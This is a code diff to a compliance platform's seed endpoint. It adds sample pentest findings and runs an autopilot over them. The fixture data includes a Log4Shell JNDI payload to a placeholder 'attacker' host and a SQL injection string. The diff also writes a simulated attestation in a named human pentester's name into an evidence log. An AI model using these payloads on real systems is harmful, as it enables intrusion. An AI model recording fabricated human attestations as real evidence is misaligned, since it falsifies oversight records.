@@ -1631,8 +1631,89 @@ class SeedFullImplantationResponse(BaseModel):
     conformity_route_state: str
     distintivo_document_id: str | None
     e040_cumplimiento_global: float | None
+    pentest_findings: int = 0
     extras_errors: list[str]
     note: str
+
+
+def _alta_pentest_candidates() -> list[dict]:
+    """Hallazgos realistas de un pentest ENS ALTO (el autopilot de Fulkro los
+    descubriría vía el arsenal MCP en Hetzner con USE_MCP_REAL). Cubren familias
+    Anexo II op.exp / op.acc / mp.com / mp.sw / mp.s vía el EnsMapper determinista
+    (Capa 1 CVE→ENS + Capa 1b patrón→ENS · sin LLM). Mezcla de severidades real."""
+    return [
+        {  # Log4Shell RCE — high+EPSS escala a critical → op.exp.5, op.exp.6
+            "title": "Apache Log4j2 RCE (Log4Shell)",
+            "description": "JNDI lookup remote code execution en log4j-core expuesto",
+            "severity": "high", "cve_id": "CVE-2021-44228",
+            "affected_host": "10.20.0.10", "affected_port": 8080,
+            "affected_service": "http",
+            "tool": "vulnscan:nuclei_scan", "source_engine": "vulnscan:nuclei_scan",
+            "rule_id": "CVE-2021-44228",
+            "raw_output_excerpt": "matched ${jndi:ldap://attacker/x}",
+        },
+        {  # regreSSHion — high → op.exp.4, op.acc.6
+            "title": "OpenSSH regreSSHion RCE pre-auth",
+            "description": "Race condition en sshd permite RCE pre-auth (CVE-2024-6387)",
+            "severity": "high", "cve_id": "CVE-2024-6387",
+            "affected_host": "vpn.cliente-alta.es", "affected_port": 22,
+            "affected_service": "ssh",
+            "tool": "vulnscan:openvas_scan", "source_engine": "vulnscan:openvas_scan",
+            "rule_id": "CVE-2024-6387",
+            "raw_output_excerpt": "OpenSSH 8.5p1 vulnerable a regreSSHion",
+        },
+        {  # TLS débil → mp.com.2, mp.com.3
+            "title": "Configuracion TLS debil (TLS 1.0 / RC4)",
+            "description": "El servidor acepta TLS 1.0 y cifradores RC4 (weak cipher)",
+            "severity": "medium",
+            "affected_host": "portal.cliente-alta.es", "affected_port": 443,
+            "affected_service": "https",
+            "tool": "webpentest:testssl", "source_engine": "webpentest:testssl",
+            "rule_id": "testssl-weak-tls",
+            "raw_output_excerpt": "TLS 1.0 offered, RC4 ciphers present",
+        },
+        {  # SQLi → mp.sw.1, op.exp.5
+            "title": "SQL Injection en formulario de login",
+            "description": "Parametro 'usuario' vulnerable a blind SQL Injection",
+            "severity": "high",
+            "affected_host": "portal.cliente-alta.es",
+            "affected_url": "https://portal.cliente-alta.es/login",
+            "affected_service": "https",
+            "tool": "webpentest:zap", "source_engine": "webpentest:zap",
+            "rule_id": "zap-sqli-40018",
+            "raw_output_excerpt": "blind SQL Injection confirmado: ' OR 1=1--",
+        },
+        {  # Cabeceras seguridad ausentes → mp.s.2
+            "title": "Cabeceras de seguridad HTTP ausentes",
+            "description": "Faltan Content-Security-Policy y Strict-Transport-Security",
+            "severity": "low",
+            "affected_host": "api.cliente-alta.es", "affected_port": 443,
+            "affected_service": "https",
+            "tool": "vulnscan:nuclei_scan", "source_engine": "vulnscan:nuclei_scan",
+            "rule_id": "http-missing-security-headers",
+            "raw_output_excerpt": "Content-Security-Policy missing; Strict-Transport-Security missing",
+        },
+        {  # SSH PermitRootLogin → op.acc.6, op.exp.3
+            "title": "SSH PermitRootLogin habilitado",
+            "description": "sshd_config permite PermitRootLogin yes (hardening CCN-STIC 619)",
+            "severity": "medium",
+            "affected_host": "10.20.0.11", "affected_port": 22,
+            "affected_service": "ssh",
+            "tool": "config:lynis_audit", "source_engine": "config:lynis_audit",
+            "rule_id": "SSH-7408",
+            "raw_output_excerpt": "PermitRootLogin yes detectado en sshd_config",
+        },
+        {  # Credenciales por defecto → op.acc.5, op.acc.4
+            "title": "Credenciales por defecto en panel admin",
+            "description": "Panel admin accesible con default credentials admin/admin",
+            "severity": "high",
+            "affected_host": "10.20.0.10", "affected_port": 8443,
+            "affected_service": "https",
+            "tool": "vulnscan:nuclei_scan", "source_engine": "vulnscan:nuclei_scan",
+            "rule_id": "default-credentials",
+            "raw_output_excerpt": "default credentials admin/admin aceptadas (HTTP 200)",
+        },
+    ]
 
 
 @router.post(
@@ -1669,6 +1750,7 @@ async def seed_full_implantation(
 
     RSEG = "Beatriz Seguridad López"
     extras_errors: list[str] = []
+    pentest_findings = 0
     cif, user_email, project_nombre, client_nombre = _resolve_test_identity(key)
 
     # ── STEP 1 · cliente + usuario + proyecto dedicado (categoría = tier) ──
@@ -1733,12 +1815,87 @@ async def seed_full_implantation(
         extras_errors.append(f"magerit: {exc}")
         await db.rollback()
 
-    # ── STEP 5 · pentest (solo ALTA) ──
+    # ── STEP 5 · pentest authorization (solo ALTA) ──
     if tier == "ALTA":
         try:
             await seed_pentest_auth_data(key=key, db=db)
         except Exception as exc:  # noqa: BLE001
             extras_errors.append(f"pentest: {exc}")
+            await db.rollback()
+
+    # ── STEP 5b · pentest AUTOPILOT REAL (solo ALTA · el "90% Fulkro") ──
+    # Entre Gate 1 (autorización/scope) y Gate 2 (atestación humana del pentester
+    # OSCP/CPSTIC) TODO lo hace el autopilot determinista de Fulkro: escaneo MCP →
+    # ZFP 1-5 → enrich CVSS/EPSS → mapeo ENS Anexo II + MITRE → Finding canónico →
+    # evidencia R6 append-only → coverage + manifest. ALTO pausa en paused_gate2;
+    # aquí simulamos la atestación humana (el 10% restante = el autónomo externo).
+    if tier == "ALTA":
+        try:
+            await db.execute(text("SET LOCAL ROLE fulkro_app_bypassrls"))
+            await set_tenant_context(db, client_id=cid, project_id=pid)
+            from datetime import datetime as _dt2, timezone as _tz2
+            from backend.app.motors.m08_verification.models import (
+                EvidenceRecord as _EvRec,
+            )
+            from backend.app.motors.m08_verification.autopilot.orchestrator import (
+                orchestrate_run as _orchestrate,
+            )
+            run_row = (await db.execute(
+                select(VerificationRun).where(
+                    VerificationRun.project_id == pid,
+                    VerificationRun.deleted_at.is_(None),
+                ).order_by(VerificationRun.created_at.desc()).limit(1)
+            )).scalar_one_or_none()
+            if run_row is not None:
+                already = (await db.execute(text(
+                    "SELECT count(*) FROM verification_findings WHERE run_id=:r "
+                    "AND deleted_at IS NULL"
+                ), {"r": str(run_row.id)})).scalar()
+                if not int(already or 0):
+                    # categoría ALTO (el seed la deja MEDIO) + scope realista ALTA
+                    run_row.category = "ALTO"
+                    run_row.scope_jsonb = {
+                        "targets": ["10.20.0.10", "10.20.0.11", "vpn.cliente-alta.es"],
+                        "web_apps": ["https://portal.cliente-alta.es",
+                                     "https://api.cliente-alta.es"],
+                        "cloud_accounts": [
+                            {"type": "aws", "asset_name": "prod-eu-account"},
+                        ],
+                        "exclusions": [],
+                    }
+                    await db.flush()
+                    summary = await _orchestrate(
+                        db, run_row.id,
+                        candidates_override=_alta_pentest_candidates(),
+                        enable_triage=False,  # determinista · sin LLM (no cuelga live)
+                    )
+                    pentest_findings = int(summary.get("findings_persisted", 0))
+                    # Gate 2 humano · atestación del pentester acreditado (el 10%)
+                    run_row.external_pentester_name = "D. Iván Serrano Gómez"
+                    run_row.external_pentester_cert = (
+                        "OSCP nº OS-118734 · habilitado CCN CPSTIC"
+                    )
+                    run_row.autopilot_status = "completed"
+                    run_row.status = "completed"
+                    db.add(_EvRec(
+                        project_id=pid, client_id=None, run_id=run_row.id,
+                        finding_id=None, run_manifest_hash=run_row.run_manifest_hash,
+                        actor="human:Iván Serrano (OSCP/CPSTIC)",
+                        action="gate2.attested", component="m08:autopilot.gate2",
+                        payload={
+                            "attested_by": "D. Iván Serrano Gómez",
+                            "cert": "OSCP OS-118734 · CPSTIC",
+                            "opinion": ("Validacion manual de explotacion segura "
+                                        "completada · hallazgos del autopilot "
+                                        "confirmados · sin falsos positivos."),
+                            "attested_at": _dt2.now(_tz2.utc).isoformat(),
+                        },
+                    ))
+                else:
+                    pentest_findings = int(already or 0)
+            await db.commit()
+        except Exception as exc:  # noqa: BLE001
+            extras_errors.append(f"pentest-autopilot: {exc}")
             await db.rollback()
 
     # ── STEP 6-9 · evidencias + políticas + firmas + declaración draft ──
@@ -1941,6 +2098,7 @@ async def seed_full_implantation(
         conformity_route_state=str(route or "NONE"),
         distintivo_document_id=distintivo_id,
         e040_cumplimiento_global=e040_pct,
+        pentest_findings=pentest_findings,
         extras_errors=extras_errors,
         note=f"Implantacion {tier} para '{project_nombre}' (cif {cif})",
     )
